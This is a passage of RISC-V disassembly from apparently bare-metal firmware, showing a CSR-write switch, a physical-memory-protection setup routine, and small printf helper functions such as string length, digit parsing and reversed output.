    10002b30:	3b379073          	csrw	pmpaddr3,a5
    10002b34:	a92d                	j	10002f6e <csr_write_num+0x5ec>
    10002b36:	d6043783          	ld	a5,-672(s0)
    10002b3a:	e0f43823          	sd	a5,-496(s0)
    10002b3e:	e1043783          	ld	a5,-496(s0)
    10002b42:	3b479073          	csrw	pmpaddr4,a5
    10002b46:	a125                	j	10002f6e <csr_write_num+0x5ec>
    10002b48:	d6043783          	ld	a5,-672(s0)
    10002b4c:	e0f43c23          	sd	a5,-488(s0)
    10002b50:	e1843783          	ld	a5,-488(s0)
    10002b54:	3b579073          	csrw	pmpaddr5,a5
    10002b58:	a919                	j	10002f6e <csr_write_num+0x5ec>
    10002b5a:	d6043783          	ld	a5,-672(s0)
    10002b5e:	e2f43023          	sd	a5,-480(s0)
    10002b62:	e2043783          	ld	a5,-480(s0)
    10002b66:	3b679073          	csrw	pmpaddr6,a5
    10002b6a:	a111                	j	10002f6e <csr_write_num+0x5ec>
    10002b6c:	d6043783          	ld	a5,-672(s0)
    10002b70:	e2f43423          	sd	a5,-472(s0)
    10002b74:	e2843783          	ld	a5,-472(s0)
    10002b78:	3b779073          	csrw	pmpaddr7,a5
    10002b7c:	aecd                	j	10002f6e <csr_write_num+0x5ec>
    10002b7e:	d6043783          	ld	a5,-672(s0)
    10002b82:	e2f43823          	sd	a5,-464(s0)
    10002b86:	e3043783          	ld	a5,-464(s0)
    10002b8a:	3b879073          	csrw	pmpaddr8,a5
    10002b8e:	a6c5                	j	10002f6e <csr_write_num+0x5ec>
    10002b90:	d6043783          	ld	a5,-672(s0)
    10002b94:	e2f43c23          	sd	a5,-456(s0)
    10002b98:	e3843783          	ld	a5,-456(s0)
    10002b9c:	3b979073          	csrw	pmpaddr9,a5
    10002ba0:	a6f9                	j	10002f6e <csr_write_num+0x5ec>
    10002ba2:	d6043783          	ld	a5,-672(s0)
    10002ba6:	e4f43023          	sd	a5,-448(s0)
    10002baa:	e4043783          	ld	a5,-448(s0)
    10002bae:	3ba79073          	csrw	pmpaddr10,a5
    10002bb2:	ae75                	j	10002f6e <csr_write_num+0x5ec>
    10002bb4:	d6043783          	ld	a5,-672(s0)
    10002bb8:	e4f43423          	sd	a5,-440(s0)
    10002bbc:	e4843783          	ld	a5,-440(s0)
    10002bc0:	3bb79073          	csrw	pmpaddr11,a5
    10002bc4:	a66d                	j	10002f6e <csr_write_num+0x5ec>
    10002bc6:	d6043783          	ld	a5,-672(s0)
    10002bca:	e4f43823          	sd	a5,-432(s0)
    10002bce:	e5043783          	ld	a5,-432(s0)
    10002bd2:	3bc79073          	csrw	pmpaddr12,a5
    10002bd6:	ae61                	j	10002f6e <csr_write_num+0x5ec>
    10002bd8:	d6043783          	ld	a5,-672(s0)
    10002bdc:	e4f43c23          	sd	a5,-424(s0)
    10002be0:	e5843783          	ld	a5,-424(s0)
    10002be4:	3bd79073          	csrw	pmpaddr13,a5
    10002be8:	a659                	j	10002f6e <csr_write_num+0x5ec>
    10002bea:	d6043783          	ld	a5,-672(s0)
    10002bee:	e6f43023          	sd	a5,-416(s0)
    10002bf2:	e6043783          	ld	a5,-416(s0)
    10002bf6:	3be79073          	csrw	pmpaddr14,a5
    10002bfa:	ae95                	j	10002f6e <csr_write_num+0x5ec>
    10002bfc:	d6043783          	ld	a5,-672(s0)
    10002c00:	e6f43423          	sd	a5,-408(s0)
    10002c04:	e6843783          	ld	a5,-408(s0)
    10002c08:	3bf79073          	csrw	pmpaddr15,a5
    10002c0c:	a68d                	j	10002f6e <csr_write_num+0x5ec>
    10002c0e:	d6043783          	ld	a5,-672(s0)
    10002c12:	e6f43823          	sd	a5,-400(s0)
    10002c16:	e7043783          	ld	a5,-400(s0)
    10002c1a:	3c079073          	csrw	0x3c0,a5
    10002c1e:	ae81                	j	10002f6e <csr_write_num+0x5ec>
    10002c20:	d6043783          	ld	a5,-672(s0)
    10002c24:	e6f43c23          	sd	a5,-392(s0)
    10002c28:	e7843783          	ld	a5,-392(s0)
    10002c2c:	3c179073          	csrw	0x3c1,a5
    10002c30:	ae3d                	j	10002f6e <csr_write_num+0x5ec>
    10002c32:	d6043783          	ld	a5,-672(s0)
    10002c36:	e8f43023          	sd	a5,-384(s0)
    10002c3a:	e8043783          	ld	a5,-384(s0)
    10002c3e:	3c279073          	csrw	0x3c2,a5
    10002c42:	a635                	j	10002f6e <csr_write_num+0x5ec>
    10002c44:	d6043783          	ld	a5,-672(s0)
    10002c48:	e8f43423          	sd	a5,-376(s0)
    10002c4c:	e8843783          	ld	a5,-376(s0)
    10002c50:	3c379073          	csrw	0x3c3,a5
    10002c54:	ae29                	j	10002f6e <csr_write_num+0x5ec>
    10002c56:	d6043783          	ld	a5,-672(s0)
    10002c5a:	e8f43823          	sd	a5,-368(s0)
    10002c5e:	e9043783          	ld	a5,-368(s0)
    10002c62:	3c479073          	csrw	0x3c4,a5
    10002c66:	a621                	j	10002f6e <csr_write_num+0x5ec>
    10002c68:	d6043783          	ld	a5,-672(s0)
    10002c6c:	e8f43c23          	sd	a5,-360(s0)
    10002c70:	e9843783          	ld	a5,-360(s0)
    10002c74:	3c579073          	csrw	0x3c5,a5
    10002c78:	acdd                	j	10002f6e <csr_write_num+0x5ec>
    10002c7a:	d6043783          	ld	a5,-672(s0)
    10002c7e:	eaf43023          	sd	a5,-352(s0)
    10002c82:	ea043783          	ld	a5,-352(s0)
    10002c86:	3c679073          	csrw	0x3c6,a5
    10002c8a:	a4d5                	j	10002f6e <csr_write_num+0x5ec>
    10002c8c:	d6043783          	ld	a5,-672(s0)
    10002c90:	eaf43423          	sd	a5,-344(s0)
    10002c94:	ea843783          	ld	a5,-344(s0)
    10002c98:	3c779073          	csrw	0x3c7,a5
    10002c9c:	acc9                	j	10002f6e <csr_write_num+0x5ec>
    10002c9e:	d6043783          	ld	a5,-672(s0)
    10002ca2:	eaf43823          	sd	a5,-336(s0)
    10002ca6:	eb043783          	ld	a5,-336(s0)
    10002caa:	3c879073          	csrw	0x3c8,a5
    10002cae:	a4c1                	j	10002f6e <csr_write_num+0x5ec>
    10002cb0:	d6043783          	ld	a5,-672(s0)
    10002cb4:	eaf43c23          	sd	a5,-328(s0)
    10002cb8:	eb843783          	ld	a5,-328(s0)
    10002cbc:	3c979073          	csrw	0x3c9,a5
    10002cc0:	a47d                	j	10002f6e <csr_write_num+0x5ec>
    10002cc2:	d6043783          	ld	a5,-672(s0)
    10002cc6:	ecf43023          	sd	a5,-320(s0)
    10002cca:	ec043783          	ld	a5,-320(s0)
    10002cce:	3ca79073          	csrw	0x3ca,a5
    10002cd2:	ac71                	j	10002f6e <csr_write_num+0x5ec>
    10002cd4:	d6043783          	ld	a5,-672(s0)
    10002cd8:	ecf43423          	sd	a5,-312(s0)
    10002cdc:	ec843783          	ld	a5,-312(s0)
    10002ce0:	3cb79073          	csrw	0x3cb,a5
    10002ce4:	a469                	j	10002f6e <csr_write_num+0x5ec>
    10002ce6:	d6043783          	ld	a5,-672(s0)
    10002cea:	ecf43823          	sd	a5,-304(s0)
    10002cee:	ed043783          	ld	a5,-304(s0)
    10002cf2:	3cc79073          	csrw	0x3cc,a5
    10002cf6:	aca5                	j	10002f6e <csr_write_num+0x5ec>
    10002cf8:	d6043783          	ld	a5,-672(s0)
    10002cfc:	ecf43c23          	sd	a5,-296(s0)
    10002d00:	ed843783          	ld	a5,-296(s0)
    10002d04:	3cd79073          	csrw	0x3cd,a5
    10002d08:	a49d                	j	10002f6e <csr_write_num+0x5ec>
    10002d0a:	d6043783          	ld	a5,-672(s0)
    10002d0e:	eef43023          	sd	a5,-288(s0)
    10002d12:	ee043783          	ld	a5,-288(s0)
    10002d16:	3ce79073          	csrw	0x3ce,a5
    10002d1a:	ac91                	j	10002f6e <csr_write_num+0x5ec>
    10002d1c:	d6043783          	ld	a5,-672(s0)
    10002d20:	eef43423          	sd	a5,-280(s0)
    10002d24:	ee843783          	ld	a5,-280(s0)
    10002d28:	3cf79073          	csrw	0x3cf,a5
    10002d2c:	a489                	j	10002f6e <csr_write_num+0x5ec>
    10002d2e:	d6043783          	ld	a5,-672(s0)
    10002d32:	eef43823          	sd	a5,-272(s0)
    10002d36:	ef043783          	ld	a5,-272(s0)
    10002d3a:	3d079073          	csrw	0x3d0,a5
    10002d3e:	ac05                	j	10002f6e <csr_write_num+0x5ec>
    10002d40:	d6043783          	ld	a5,-672(s0)
    10002d44:	eef43c23          	sd	a5,-264(s0)
    10002d48:	ef843783          	ld	a5,-264(s0)
    10002d4c:	3d179073          	csrw	0x3d1,a5
    10002d50:	ac39                	j	10002f6e <csr_write_num+0x5ec>
    10002d52:	d6043783          	ld	a5,-672(s0)
    10002d56:	f0f43023          	sd	a5,-256(s0)
    10002d5a:	f0043783          	ld	a5,-256(s0)
    10002d5e:	3d279073          	csrw	0x3d2,a5
    10002d62:	a431                	j	10002f6e <csr_write_num+0x5ec>
    10002d64:	d6043783          	ld	a5,-672(s0)
    10002d68:	f0f43423          	sd	a5,-248(s0)
    10002d6c:	f0843783          	ld	a5,-248(s0)
    10002d70:	3d379073          	csrw	0x3d3,a5
    10002d74:	aaed                	j	10002f6e <csr_write_num+0x5ec>
    10002d76:	d6043783          	ld	a5,-672(s0)
    10002d7a:	f0f43823          	sd	a5,-240(s0)
    10002d7e:	f1043783          	ld	a5,-240(s0)
    10002d82:	3d479073          	csrw	0x3d4,a5
    10002d86:	a2e5                	j	10002f6e <csr_write_num+0x5ec>
    10002d88:	d6043783          	ld	a5,-672(s0)
    10002d8c:	f0f43c23          	sd	a5,-232(s0)
    10002d90:	f1843783          	ld	a5,-232(s0)
    10002d94:	3d579073          	csrw	0x3d5,a5
    10002d98:	aad9                	j	10002f6e <csr_write_num+0x5ec>
    10002d9a:	d6043783          	ld	a5,-672(s0)
    10002d9e:	f2f43023          	sd	a5,-224(s0)
    10002da2:	f2043783          	ld	a5,-224(s0)
    10002da6:	3d679073          	csrw	0x3d6,a5
    10002daa:	a2d1                	j	10002f6e <csr_write_num+0x5ec>
    10002dac:	d6043783          	ld	a5,-672(s0)
    10002db0:	f2f43423          	sd	a5,-216(s0)
    10002db4:	f2843783          	ld	a5,-216(s0)
    10002db8:	3d779073          	csrw	0x3d7,a5
    10002dbc:	aa4d                	j	10002f6e <csr_write_num+0x5ec>
    10002dbe:	d6043783          	ld	a5,-672(s0)
    10002dc2:	f2f43823          	sd	a5,-208(s0)
    10002dc6:	f3043783          	ld	a5,-208(s0)
    10002dca:	3d879073          	csrw	0x3d8,a5
    10002dce:	a245                	j	10002f6e <csr_write_num+0x5ec>
    10002dd0:	d6043783          	ld	a5,-672(s0)
    10002dd4:	f2f43c23          	sd	a5,-200(s0)
    10002dd8:	f3843783          	ld	a5,-200(s0)
    10002ddc:	3d979073          	csrw	0x3d9,a5
    10002de0:	a279                	j	10002f6e <csr_write_num+0x5ec>
    10002de2:	d6043783          	ld	a5,-672(s0)
    10002de6:	f4f43023          	sd	a5,-192(s0)
    10002dea:	f4043783          	ld	a5,-192(s0)
    10002dee:	3da79073          	csrw	0x3da,a5
    10002df2:	aab5                	j	10002f6e <csr_write_num+0x5ec>
    10002df4:	d6043783          	ld	a5,-672(s0)
    10002df8:	f4f43423          	sd	a5,-184(s0)
    10002dfc:	f4843783          	ld	a5,-184(s0)
    10002e00:	3db79073          	csrw	0x3db,a5
    10002e04:	a2ad                	j	10002f6e <csr_write_num+0x5ec>
    10002e06:	d6043783          	ld	a5,-672(s0)
    10002e0a:	f4f43823          	sd	a5,-176(s0)
    10002e0e:	f5043783          	ld	a5,-176(s0)
    10002e12:	3dc79073          	csrw	0x3dc,a5
    10002e16:	aaa1                	j	10002f6e <csr_write_num+0x5ec>
    10002e18:	d6043783          	ld	a5,-672(s0)
    10002e1c:	f4f43c23          	sd	a5,-168(s0)
    10002e20:	f5843783          	ld	a5,-168(s0)
    10002e24:	3dd79073          	csrw	0x3dd,a5
    10002e28:	a299                	j	10002f6e <csr_write_num+0x5ec>
    10002e2a:	d6043783          	ld	a5,-672(s0)
    10002e2e:	f6f43023          	sd	a5,-160(s0)
    10002e32:	f6043783          	ld	a5,-160(s0)
    10002e36:	3de79073          	csrw	0x3de,a5
    10002e3a:	aa15                	j	10002f6e <csr_write_num+0x5ec>
    10002e3c:	d6043783          	ld	a5,-672(s0)
    10002e40:	f6f43423          	sd	a5,-152(s0)
    10002e44:	f6843783          	ld	a5,-152(s0)
    10002e48:	3df79073          	csrw	0x3df,a5
    10002e4c:	a20d                	j	10002f6e <csr_write_num+0x5ec>
    10002e4e:	d6043783          	ld	a5,-672(s0)
    10002e52:	f6f43823          	sd	a5,-144(s0)
    10002e56:	f7043783          	ld	a5,-144(s0)
    10002e5a:	3e079073          	csrw	0x3e0,a5
    10002e5e:	aa01                	j	10002f6e <csr_write_num+0x5ec>
    10002e60:	d6043783          	ld	a5,-672(s0)
    10002e64:	f6f43c23          	sd	a5,-136(s0)
    10002e68:	f7843783          	ld	a5,-136(s0)
    10002e6c:	3e179073          	csrw	0x3e1,a5
    10002e70:	a8fd                	j	10002f6e <csr_write_num+0x5ec>
    10002e72:	d6043783          	ld	a5,-672(s0)
    10002e76:	f8f43023          	sd	a5,-128(s0)
    10002e7a:	f8043783          	ld	a5,-128(s0)
    10002e7e:	3e279073          	csrw	0x3e2,a5
    10002e82:	a0f5                	j	10002f6e <csr_write_num+0x5ec>
    10002e84:	d6043783          	ld	a5,-672(s0)
    10002e88:	f8f43423          	sd	a5,-120(s0)
    10002e8c:	f8843783          	ld	a5,-120(s0)
    10002e90:	3e379073          	csrw	0x3e3,a5
    10002e94:	a8e9                	j	10002f6e <csr_write_num+0x5ec>
    10002e96:	d6043783          	ld	a5,-672(s0)
    10002e9a:	f8f43823          	sd	a5,-112(s0)
    10002e9e:	f9043783          	ld	a5,-112(s0)
    10002ea2:	3e479073          	csrw	0x3e4,a5
    10002ea6:	a0e1                	j	10002f6e <csr_write_num+0x5ec>
    10002ea8:	d6043783          	ld	a5,-672(s0)
    10002eac:	f8f43c23          	sd	a5,-104(s0)
    10002eb0:	f9843783          	ld	a5,-104(s0)
    10002eb4:	3e579073          	csrw	0x3e5,a5
    10002eb8:	a85d                	j	10002f6e <csr_write_num+0x5ec>
    10002eba:	d6043783          	ld	a5,-672(s0)
    10002ebe:	faf43023          	sd	a5,-96(s0)
    10002ec2:	fa043783          	ld	a5,-96(s0)
    10002ec6:	3e679073          	csrw	0x3e6,a5
    10002eca:	a055                	j	10002f6e <csr_write_num+0x5ec>
    10002ecc:	d6043783          	ld	a5,-672(s0)
    10002ed0:	faf43423          	sd	a5,-88(s0)
    10002ed4:	fa843783          	ld	a5,-88(s0)
    10002ed8:	3e779073          	csrw	0x3e7,a5
    10002edc:	a849                	j	10002f6e <csr_write_num+0x5ec>
    10002ede:	d6043783          	ld	a5,-672(s0)
    10002ee2:	faf43823          	sd	a5,-80(s0)
    10002ee6:	fb043783          	ld	a5,-80(s0)
    10002eea:	3e879073          	csrw	0x3e8,a5
    10002eee:	a041                	j	10002f6e <csr_write_num+0x5ec>
    10002ef0:	d6043783          	ld	a5,-672(s0)
    10002ef4:	faf43c23          	sd	a5,-72(s0)
    10002ef8:	fb843783          	ld	a5,-72(s0)
    10002efc:	3e979073          	csrw	0x3e9,a5
    10002f00:	a0bd                	j	10002f6e <csr_write_num+0x5ec>
    10002f02:	d6043783          	ld	a5,-672(s0)
    10002f06:	fcf43023          	sd	a5,-64(s0)
    10002f0a:	fc043783          	ld	a5,-64(s0)
    10002f0e:	3ea79073          	csrw	0x3ea,a5
    10002f12:	a8b1                	j	10002f6e <csr_write_num+0x5ec>
    10002f14:	d6043783          	ld	a5,-672(s0)
    10002f18:	fcf43423          	sd	a5,-56(s0)
    10002f1c:	fc843783          	ld	a5,-56(s0)
    10002f20:	3eb79073          	csrw	0x3eb,a5
    10002f24:	a0a9                	j	10002f6e <csr_write_num+0x5ec>
    10002f26:	d6043783          	ld	a5,-672(s0)
    10002f2a:	fcf43823          	sd	a5,-48(s0)
    10002f2e:	fd043783          	ld	a5,-48(s0)
    10002f32:	3ec79073          	csrw	0x3ec,a5
    10002f36:	a825                	j	10002f6e <csr_write_num+0x5ec>
    10002f38:	d6043783          	ld	a5,-672(s0)
    10002f3c:	fcf43c23          	sd	a5,-40(s0)
    10002f40:	fd843783          	ld	a5,-40(s0)
    10002f44:	3ed79073          	csrw	0x3ed,a5
    10002f48:	a01d                	j	10002f6e <csr_write_num+0x5ec>
    10002f4a:	d6043783          	ld	a5,-672(s0)
    10002f4e:	fef43023          	sd	a5,-32(s0)
    10002f52:	fe043783          	ld	a5,-32(s0)
    10002f56:	3ee79073          	csrw	0x3ee,a5
    10002f5a:	a811                	j	10002f6e <csr_write_num+0x5ec>
    10002f5c:	d6043783          	ld	a5,-672(s0)
    10002f60:	fef43423          	sd	a5,-24(s0)
    10002f64:	fe843783          	ld	a5,-24(s0)
    10002f68:	3ef79073          	csrw	0x3ef,a5
    10002f6c:	0001                	nop
    10002f6e:	0001                	nop
    10002f70:	29813403          	ld	s0,664(sp)
    10002f74:	2a010113          	addi	sp,sp,672
    10002f78:	8082                	ret

Disassembly of section .text.init_pmp:

0000000010002f7a <init_pmp>:
    10002f7a:	1101                	addi	sp,sp,-32
    10002f7c:	ec06                	sd	ra,24(sp)
    10002f7e:	e822                	sd	s0,16(sp)
    10002f80:	1000                	addi	s0,sp,32
    10002f82:	fe042623          	sw	zero,-20(s0)
    10002f86:	a839                	j	10002fa4 <init_pmp+0x2a>
    10002f88:	fec42783          	lw	a5,-20(s0)
    10002f8c:	3b07879b          	addiw	a5,a5,944
    10002f90:	2781                	sext.w	a5,a5
    10002f92:	55fd                	li	a1,-1
    10002f94:	853e                	mv	a0,a5
    10002f96:	9edff0ef          	jal	10002982 <csr_write_num>
    10002f9a:	fec42783          	lw	a5,-20(s0)
    10002f9e:	2785                	addiw	a5,a5,1
    10002fa0:	fef42623          	sw	a5,-20(s0)
    10002fa4:	fec42783          	lw	a5,-20(s0)
    10002fa8:	0007871b          	sext.w	a4,a5
    10002fac:	47bd                	li	a5,15
    10002fae:	fce7dde3          	bge	a5,a4,10002f88 <init_pmp+0xe>
    10002fb2:	47fd                	li	a5,31
    10002fb4:	17e2                	slli	a5,a5,0x38
    10002fb6:	3a279073          	csrw	pmpcfg2,a5
    10002fba:	12000073          	sfence.vma
    10002fbe:	0001                	nop
    10002fc0:	60e2                	ld	ra,24(sp)
    10002fc2:	6442                	ld	s0,16(sp)
    10002fc4:	6105                	addi	sp,sp,32
    10002fc6:	8082                	ret

Disassembly of section .text._out_null:

0000000010002fc8 <_out_null>:
    10002fc8:	7179                	addi	sp,sp,-48
    10002fca:	f422                	sd	s0,40(sp)
    10002fcc:	1800                	addi	s0,sp,48
    10002fce:	87aa                	mv	a5,a0
    10002fd0:	feb43023          	sd	a1,-32(s0)
    10002fd4:	fcc43c23          	sd	a2,-40(s0)
    10002fd8:	fcd43823          	sd	a3,-48(s0)
    10002fdc:	fef407a3          	sb	a5,-17(s0)
    10002fe0:	0001                	nop
    10002fe2:	7422                	ld	s0,40(sp)
    10002fe4:	6145                	addi	sp,sp,48
    10002fe6:	8082                	ret

Disassembly of section .text._out_char:

0000000010002fe8 <_out_char>:
    10002fe8:	7179                	addi	sp,sp,-48
    10002fea:	f406                	sd	ra,40(sp)
    10002fec:	f022                	sd	s0,32(sp)
    10002fee:	1800                	addi	s0,sp,48
    10002ff0:	87aa                	mv	a5,a0
    10002ff2:	feb43023          	sd	a1,-32(s0)
    10002ff6:	fcc43c23          	sd	a2,-40(s0)
    10002ffa:	fcd43823          	sd	a3,-48(s0)
    10002ffe:	fef407a3          	sb	a5,-17(s0)
    10003002:	fef44783          	lbu	a5,-17(s0)
    10003006:	0ff7f793          	zext.b	a5,a5
    1000300a:	c791                	beqz	a5,10003016 <_out_char+0x2e>
    1000300c:	fef44783          	lbu	a5,-17(s0)
    10003010:	853e                	mv	a0,a5
    10003012:	f9aff0ef          	jal	100027ac <_putc>
    10003016:	0001                	nop
    10003018:	70a2                	ld	ra,40(sp)
    1000301a:	7402                	ld	s0,32(sp)
    1000301c:	6145                	addi	sp,sp,48
    1000301e:	8082                	ret

Disassembly of section .text._strnlen_s:

0000000010003020 <_strnlen_s>:
    10003020:	7179                	addi	sp,sp,-48
    10003022:	f422                	sd	s0,40(sp)
    10003024:	1800                	addi	s0,sp,48
    10003026:	fca43c23          	sd	a0,-40(s0)
    1000302a:	fcb43823          	sd	a1,-48(s0)
    1000302e:	fd843783          	ld	a5,-40(s0)
    10003032:	fef43423          	sd	a5,-24(s0)
    10003036:	a031                	j	10003042 <_strnlen_s+0x22>
    10003038:	fe843783          	ld	a5,-24(s0)
    1000303c:	0785                	addi	a5,a5,1
    1000303e:	fef43423          	sd	a5,-24(s0)
    10003042:	fe843783          	ld	a5,-24(s0)
    10003046:	0007c783          	lbu	a5,0(a5)
    1000304a:	cb81                	beqz	a5,1000305a <_strnlen_s+0x3a>
    1000304c:	fd043783          	ld	a5,-48(s0)
    10003050:	fff78713          	addi	a4,a5,-1
    10003054:	fce43823          	sd	a4,-48(s0)
    10003058:	f3e5                	bnez	a5,10003038 <_strnlen_s+0x18>
    1000305a:	fe843703          	ld	a4,-24(s0)
    1000305e:	fd843783          	ld	a5,-40(s0)
    10003062:	40f707b3          	sub	a5,a4,a5
    10003066:	2781                	sext.w	a5,a5
    10003068:	853e                	mv	a0,a5
    1000306a:	7422                	ld	s0,40(sp)
    1000306c:	6145                	addi	sp,sp,48
    1000306e:	8082                	ret

Disassembly of section .text._is_digit:

0000000010003070 <_is_digit>:
    10003070:	1101                	addi	sp,sp,-32
    10003072:	ec22                	sd	s0,24(sp)
    10003074:	1000                	addi	s0,sp,32
    10003076:	87aa                	mv	a5,a0
    10003078:	fef407a3          	sb	a5,-17(s0)
    1000307c:	fef44783          	lbu	a5,-17(s0)
    10003080:	0ff7f713          	zext.b	a4,a5
    10003084:	02f00793          	li	a5,47
    10003088:	00e7fc63          	bgeu	a5,a4,100030a0 <_is_digit+0x30>
    1000308c:	fef44783          	lbu	a5,-17(s0)
    10003090:	0ff7f713          	zext.b	a4,a5
    10003094:	03900793          	li	a5,57
    10003098:	00e7e463          	bltu	a5,a4,100030a0 <_is_digit+0x30>
    1000309c:	4785                	li	a5,1
    1000309e:	a011                	j	100030a2 <_is_digit+0x32>
    100030a0:	4781                	li	a5,0
    100030a2:	8b85                	andi	a5,a5,1
    100030a4:	0ff7f793          	zext.b	a5,a5
    100030a8:	853e                	mv	a0,a5
    100030aa:	6462                	ld	s0,24(sp)
    100030ac:	6105                	addi	sp,sp,32
    100030ae:	8082                	ret

Disassembly of section .text._atoi:

00000000100030b0 <_atoi>:
    100030b0:	7179                	addi	sp,sp,-48
    100030b2:	f406                	sd	ra,40(sp)
    100030b4:	f022                	sd	s0,32(sp)
    100030b6:	1800                	addi	s0,sp,48
    100030b8:	fca43c23          	sd	a0,-40(s0)
    100030bc:	fe042623          	sw	zero,-20(s0)
    100030c0:	a82d                	j	100030fa <_atoi+0x4a>
    100030c2:	fec42783          	lw	a5,-20(s0)
    100030c6:	873e                	mv	a4,a5
    100030c8:	87ba                	mv	a5,a4
    100030ca:	0027979b          	slliw	a5,a5,0x2
    100030ce:	9fb9                	addw	a5,a5,a4
    100030d0:	0017979b          	slliw	a5,a5,0x1
    100030d4:	0007871b          	sext.w	a4,a5
    100030d8:	fd843783          	ld	a5,-40(s0)
    100030dc:	639c                	ld	a5,0(a5)
    100030de:	00178613          	addi	a2,a5,1
    100030e2:	fd843683          	ld	a3,-40(s0)
    100030e6:	e290                	sd	a2,0(a3)
    100030e8:	0007c783          	lbu	a5,0(a5)
    100030ec:	2781                	sext.w	a5,a5
    100030ee:	9fb9                	addw	a5,a5,a4
    100030f0:	2781                	sext.w	a5,a5
    100030f2:	fd07879b          	addiw	a5,a5,-48
    100030f6:	fef42623          	sw	a5,-20(s0)
    100030fa:	fd843783          	ld	a5,-40(s0)
    100030fe:	639c                	ld	a5,0(a5)
    10003100:	0007c783          	lbu	a5,0(a5)
    10003104:	853e                	mv	a0,a5
    10003106:	f6bff0ef          	jal	10003070 <_is_digit>
    1000310a:	87aa                	mv	a5,a0
    1000310c:	fbdd                	bnez	a5,100030c2 <_atoi+0x12>
    1000310e:	fec42783          	lw	a5,-20(s0)
    10003112:	853e                	mv	a0,a5
    10003114:	70a2                	ld	ra,40(sp)
    10003116:	7402                	ld	s0,32(sp)
    10003118:	6145                	addi	sp,sp,48
    1000311a:	8082                	ret

Disassembly of section .text._out_rev:

000000001000311c <_out_rev>:
    1000311c:	711d                	addi	sp,sp,-96
    1000311e:	ec86                	sd	ra,88(sp)
    10003120:	e8a2                	sd	s0,80(sp)
    10003122:	1080                	addi	s0,sp,96
    10003124:	fca43c23          	sd	a0,-40(s0)
    10003128:	fcb43823          	sd	a1,-48(s0)
    1000312c:	fcc43423          	sd	a2,-56(s0)
    10003130:	fcd43023          	sd	a3,-64(s0)
    10003134:	fae43c23          	sd	a4,-72(s0)
    10003138:	faf43823          	sd	a5,-80(s0)
    1000313c:	87c2                	mv	a5,a6
    1000313e:	8746                	mv	a4,a7
    10003140:	faf42623          	sw	a5,-84(s0)
    10003144:	87ba                	mv	a5,a4
    10003146:	faf42423          	sw	a5,-88(s0)
    1000314a:	fc843783          	ld	a5,-56(s0)
    1000314e:	fef43023          	sd	a5,-32(s0)
    10003152:	fa842783          	lw	a5,-88(s0)
    10003156:	8b89                	andi	a5,a5,2
    10003158:	2781                	sext.w	a5,a5
    1000315a:	e3c9                	bnez	a5,100031dc <_out_rev+0xc0>
    1000315c:	fa842783          	lw	a5,-88(s0)
    10003160:	8b85                	andi	a5,a5,1
    10003162:	2781                	sext.w	a5,a5
    10003164:	efa5                	bnez	a5,100031dc <_out_rev+0xc0>
    10003166:	fb043783          	ld	a5,-80(s0)
    1000316a:	fef43423          	sd	a5,-24(s0)
    1000316e:	a035                	j	1000319a <_out_rev+0x7e>
    10003170:	fc843783          	ld	a5,-56(s0)
    10003174:	00178713          	addi	a4,a5,1
    10003178:	fce43423          	sd	a4,-56(s0)
    1000317c:	fd843703          	ld	a4,-40(s0)
    10003180:	fc043683          	ld	a3,-64(s0)
    10003184:	863e                	mv	a2,a5
    10003186:	fd043583          	ld	a1,-48(s0)
    1000318a:	02000513          	li	a0,32
    1000318e:	9702                	jalr	a4
    10003190:	fe843783          	ld	a5,-24(s0)
    10003194:	0785                	addi	a5,a5,1
    10003196:	fef43423          	sd	a5,-24(s0)
    1000319a:	fac46783          	lwu	a5,-84(s0)
    1000319e:	fe843703          	ld	a4,-24(s0)
    100031a2:	fcf767e3          	bltu	a4,a5,10003170 <_out_rev+0x54>
    100031a6:	a81d                	j	100031dc <_out_rev+0xc0>
    100031a8:	fb043783          	ld	a5,-80(s0)
    100031ac:	17fd                	addi	a5,a5,-1
    100031ae:	faf43823          	sd	a5,-80(s0)
    100031b2:	fb843703          	ld	a4,-72(s0)
    100031b6:	fb043783          	ld	a5,-80(s0)
    100031ba:	97ba                	add	a5,a5,a4
    100031bc:	0007c503          	lbu	a0,0(a5)
    100031c0:	fc843783          	ld	a5,-56(s0)
    100031c4:	00178713          	addi	a4,a5,1
    100031c8:	fce43423          	sd	a4,-56(s0)
    100031cc:	fd843703          	ld	a4,-40(s0)
    100031d0:	fc043683          	ld	a3,-64(s0)
    100031d4:	863e                	mv	a2,a5
    100031d6:	fd043583          	ld	a1,-48(s0)
    100031da:	9702                	jalr	a4
    100031dc:	fb043783          	ld	a5,-80(s0)
    100031e0:	f7e1                	bnez	a5,100031a8 <_out_rev+0x8c>
    100031e2:	fa842783          	lw	a5,-88(s0)
    100031e6:	8b89                	andi	a5,a5,2
    100031e8:	2781                	sext.w	a5,a5
    100031ea:	cb9d                	beqz	a5,10003220 <_out_rev+0x104>
    100031ec:	a00d                	j	1000320e <_out_rev+0xf2>
    100031ee:	fc843783          	ld	a5,-56(s0)
    100031f2:	00178713          	addi	a4,a5,1
    100031f6:	fce43423          	sd	a4,-56(s0)
    100031fa:	fd843703          	ld	a4,-40(s0)
    100031fe:	fc043683          	ld	a3,-64(s0)
    10003202:	863e                	mv	a2,a5
    10003204:	fd043583          	ld	a1,-48(s0)
    10003208:	02000513          	li	a0,32
    1000320c:	9702                	jalr	a4
    1000320e:	fc843703          	ld	a4,-56(s0)
    10003212:	fe043783          	ld	a5,-32(s0)
    10003216:	8f1d                	sub	a4,a4,a5
    10003218:	fac46783          	lwu	a5,-84(s0)
    1000321c:	fcf769e3          	bltu	a4,a5,100031ee <_out_rev+0xd2>
    10003220:	fc843783          	ld	a5,-56(s0)
    10003224:	853e                	mv	a0,a5
    10003226:	60e6                	ld	ra,88(sp)
    10003228:	6446                	ld	s0,80(sp)
    1000322a:	6125                	addi	sp,sp,96
    1000322c:	8082                	ret

Disassembly of section .text._ntoa_format:

000000001000322e <_ntoa_format>:
    1000322e:	715d                	addi	sp,sp,-80
    10003230:	e486                	sd	ra,72(sp)
    10003232:	e0a2                	sd	s0,64(sp)
    10003234:	0880                	addi	s0,sp,80
    10003236:	fea43423          	sd	a0,-24(s0)
    1000323a:	feb43023          	sd	a1,-32(s0)
    1000323e:	fcc43c23          	sd	a2,-40(s0)
    10003242:	fcd43823          	sd	a3,-48(s0)
    10003246:	fce43423          	sd	a4,-56(s0)
    1000324a:	fcf43023          	sd	a5,-64(s0)
    1000324e:	87c2                	mv	a5,a6
    10003250:	8746                	mv	a4,a7
    10003252:	faf40fa3          	sb	a5,-65(s0)
    10003256:	87ba                	mv	a5,a4
    10003258:	faf42c23          	sw	a5,-72(s0)
    1000325c:	481c                	lw	a5,16(s0)
    1000325e:	8b89                	andi	a5,a5,2
